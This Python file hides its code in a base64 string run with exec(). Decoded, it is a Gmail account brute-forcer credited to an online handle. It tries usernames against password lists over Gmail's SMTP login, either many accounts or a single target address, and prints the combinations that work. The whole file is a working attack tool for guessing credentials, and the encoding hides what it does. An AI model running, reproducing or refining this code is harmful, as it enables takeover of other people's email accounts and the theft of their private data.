import marshal, base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24KZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCBhYnNvbHV0ZV9pbXBvcnQKZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCBwcmludF9mdW5jdGlvbgpmcm9tIHNpeC5tb3ZlcyBpbXBvcnQgaW5wdXQKcHJpbnQoJycnCgk9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Cgl8ICAgICAgW0dtYWlsXSA9PT4gMyAgICAgICAgICAgICB8Cgl8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS18Cgl8IEluc3RhZ3JhbSBAc2h1YmhhbV9nMHNhaW4gICAgICB8Cgl8IENvRGVEIEJ5IFNodUJoYW1nMHNhaW4gICAgICAgICB8Cgl8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS18CgoJJycnKQppbXBvcnQgc210cGxpYgpmcm9tIG9zIGltcG9ydCBzeXN0ZW0KCgpzbXRwID0gc210cGxpYi5TTVRQKCJzbXRwLmdtYWlsLmNvbSIsNTg3KQpzbXRwLnN0YXJ0dGxzKCkKc210cC5laGxvKCkKCmRvID0gaW5wdXQoJycnCgkJQ2hvb3NlIGFueSBudW1iZXIgPwoJCTEgLSBFbWFpbCBmaWxlCgkJMiAtIHRhcmdldCBlbWFpbAoJCQoJCT09PiAnJycpCgppZiBkbyA9PSAnMSc6CiAgICB1c2VyID0gaW5wdXQoIkxpc3QgT2YgVXNlcm5hbWVzID0+ICIpCiAgICBwYXNzZmlsZSA9IGlucHV0KCJMaXN0IE9mIFBhc3N3b3JkcyA9PiAiKQogICAgbG9vcF91c2VyID0gb3Blbih1c2VyLCAncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkKICAgIGxvb3BfcGFzc2ZpbGUgPSBvcGVuKHBhc3NmaWxlLCAncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkKICAgIGhlYWRlcnMgPSBbKCdVc2VyLWFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODY7IGVuLVVTOyBydjoxLjkuMC4xKSBHZWNrby8yMDA4MDcxNjE1IEZlZG9yYS8zLjAuMS0xLmZjOSBGaXJlZm94LzMuMC4xJyldCiAgICBmb3IgdXNlciBpbiBsb29wX3VzZXI6CiAgICAgICAgZm9yIHBhc3NmaWxlIGluIGxvb3BfcGFzc2ZpbGU6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNtdHAubG9naW4odXNlciwgcGFzc2ZpbGUpCgogICAgICAgICAgICAgICAgcHJpbnQoKCJcMDMzWzE7MzdtZ29vZCAtPiAlcyAiICUgdXNlciArICIgLT4gJXMgXDAzM1sxO20iICUgcGFzc2ZpbGUgKSkKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBleGNlcHQgc210cGxpYi5TTVRQQXV0aGVudGljYXRpb25FcnJvcjoKICAgICAgICAgICAgICAgcHJpbnQoKCJcMDMzWzE7MzFtc29ycnkgJXMgIiAlIHVzZXIgKyAiIC0+ICVzIFwwMzNbMTttIiAlIHBhc3NmaWxlICkpCiMjIyMjIyMjIyMjIwppZiBkbyA9PSAnMic6CgogICAgc210cHMgPSBzbXRwbGliLlNNVFAoInNtdHAuZ21haWwuY29tIiw1ODcpCiAgICBzbXRwcy5laGxvKCkKICAgIHNtdHBzLnN0YXJ0dGxzKCkKICAgIHVzZXIgPSBpbnB1dCgiZW1haWwgOiAiKQogICAgc2VuaGEgPSBpbnB1dCgicGFzc2xpc3QgOiAiKQogICAgc2VuaGEgPSBvcGVuKHNlbmhhLCAiciIpCgpoZWFkZXJzID0gWygnVXNlci1hZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2OyBlbi1VUzsgcnY6MS45LjAuMSkgR2Vja28vMjAwODA3MTYxNSBGZWRvcmEvMy4wLjEtMS5mYzkgRmlyZWZveC8zLjAuMScpXQoKCgpmb3IgcGFzc3dvcmQgaW4gc2VuaGE6CiAgICB0cnk6CiAgICAgICAgc210cHMubG9naW4odXNlcixwYXNzd29yZCkKICAgICAgICBwcmludCgiXDAzM1sxOzM3bWdvb2QgLT4gJXNcMDMzWzE7bSIgICUgcGFzc3dvcmQpCiAgICAgICAgYnJlYWs7CiAgICBleGNlcHQgc210cGxpYi5TTVRQQXV0aGVudGljYXRpb25FcnJvcjoKICAgICAgICBwcmludCgiXDAzM1sxOzMxbXNvcnJ5IFwwMzNbMTttIikKCgoKCgo="))
